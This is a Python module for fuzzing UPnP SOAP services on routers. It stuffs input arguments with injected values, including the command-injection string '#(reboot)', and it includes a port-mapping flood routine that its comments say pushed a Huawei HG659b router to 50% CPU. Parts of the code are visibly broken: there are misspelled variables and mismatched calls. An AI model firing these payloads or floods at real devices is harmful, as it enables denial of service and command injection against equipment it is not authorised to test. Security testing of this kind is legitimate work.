"""SOAP as a protocol has various uses, so why not a module for automated SOAP fuzzing.
Ideally it can be used with a separate fuzzer like sfuzz."""
#! /usr/bin/env python3
import SOAP_Handler
import requests

class dirtySOAP_Handler(SOAP_Handler):
	def __init__(self, address_String):
		SOAP_Handler.__init__(self, address_String)

	def add_Linux_Command(self, command):
		self.command_linux = command

	def make_Dirty_Packet(self, dirt, arguments_List):
		"""Stuffs every variable with whatever you specify as dirt."""
		arguments_body = ""
		num_Arguments_Out = 0
		arguments_Out_List = []
		for entry in arguments_List:
			if entry.direction == "out":
				num_Arguments_Out += 1
				arguments_Out_List.append(entry.name)
				argument_Opener = "<" + entry.name + ">"
				argument_Closer = "</" + entry.name + ">"
			else:
				#user_Input = raw_input("		Enter a value for %s: " % entry.name)
				#command = raw_input("		Enter some dirt (linux commands, escape chars etc) for %s >" % (entry.name))
				argument_Opener = "<" + entry.name + ">"
				argument_Opener += dirt
				argument_Closer = "</" + entry.name + ">"
			arguments_body += argument_Opener
			arguments_body += argument_Closer
		self.arguments_body = arguments_body
		self.num_Arguments_Out = num_Arguments_Out
		self.arguments_Out_List = arguments_Out_List

	def make_Auto_Packet(self, arguments_List):
		"""Use detected or specified datatypes to determine what to put in the SOAP packet."""
		arguments_body = ""
		command = ""
		num_Arguments_Out = 0
		arguments_Out_List = []
		for entry in arguments_List:
			if entry.direction == "out":
				num_Arguments_Out += 1
				arguments_Out_List.append(entry.name)
				argument_Opener = "<" + entry.name + ">"
				argument_Closer = "</" + entry.name + ">"
			else:
				#user_Input = raw_input("		Enter a value for %s: " % entry.name)
				#command = raw_input("		Enter some dirt (linux commands, escape chars etc) for %s >" % (entry.name))
				if entry.datatype.upper().endswith("STRING"):
					command = "#(reboot)"
				elif entry.datatype.upper().endswith("BOOLEAN"):
					commmand = "-1"
				elif entry.datatype.upper().endswith("UI1"):
					commmand = -1
				elif entry.datatype.upper().endswith("UI4"):
					commmand = "-1"
				else:
					print("(!) No matches on the datatype... ", entry.datatype)
					print("Name: ", entry.name)
					command = "1"
				argument_Opener = "<" + entry.name + ">"
				argument_Opener += str(command)
				argument_Closer = "</" + entry.name + ">"
			arguments_body += argument_Opener
			arguments_body += argument_Closer
		self.arguments_body = arguments_body
		self.num_Arguments_Out = num_Arguments_Out
		self.arguments_Out_List = arguments_Out_List

	def prepare_Dirty_SOAP(self, device, this_action, this_Service, dirt):
		"""Assembles all the component parts of the packet including the filled list
		of variables to submit to the service at hand."""
		self.set_Action_Tag_Opener(this_action.name, this_Service.name)
		self.set_Action_Tag_Closer(this_action.name)
		self.make_Dirty_Packet(dirt, this_action.arguments_List)
		self.set_Control_URL(this_Service.control_url)
		self.set_Control_Port(device.presentation_port)
		self.set_SOAP_Destination()
		self.compile_SOAP_Message()	

	def handle_Dirty_SOAP(self, device, this_action, this_Service, dirt):
		"""Entry point for """
		these_Status_Codes = set()
		self.prepare_Dirty_SOAP(device, this_action, this_Service)
		self.make_Dirty_Packet(dirt, this_action.arguments)
		print(self.num_Arguments_Out, " < Num arguments out")
		self.compile_SOAP_Message()
		try:
			reply = self.send_SOAP_Message()
			print(reply.text)
			print("Got SOAP Responses")
			SOAP_Responses = self.parse_SOAP_Response(reply)
			for entry in SOAP_Responses:
				these_Status_Codes.add(reply.status_code)
				print(reply.status_code)
			#	for variable in this_Service.state_variable_table.variables:
			#		if entry.key == variable.name:
			#			variable.value = entry.value
		except:
			print("		Error during SOAP transaction. Check network.")
		return these_Status_Codes

	def do_Portmapping_Flood(self):
		"""The idea was to flood a router with portmapping requests, which generally take
		the largest amount of arguments and therefore server (router) side processing of 
		your input. Huawei HG659b goes to 50% cpu usage. Turns out it has a LILO queue of 30."""
		SOAP_Message = """<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"
   							s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
   							<s:Body><u:AddPortMapping xmlns:s="urn:schemas-upnp-org:service:WANPPPConnection:1"><NewRemoteHost></NewRemoteHost><NewExternalPort>395</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>12196</NewInternalPort><NewInternalClient>192.168.1.100</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>Big description string, just to consume a bit more memory. We have about a Tweet.</NewPortMappingDescription><NewLeaseDuration>1</NewLeaseDuration></u:AddPortMapping></s:Body>
							</s:Envelope>
							"""
		x = 395
		y = 12196
		status = "200"
		while "200" in status:
			reply = requests.post(self.destination, timeout=5, data=SOAP_Message)
			SOAP_Message = SOAP_Message.replace(str(y), str(y+1))
			SOAP_Message = SOAP_Message.replace(str(x), str(x+1))
			x +=1
			y +=1
			print("Sent a portmapping request.")
			print(SOAP_Message)
			status = str(reply.status_code)
		print("Finished loop")
		print(reply.text)
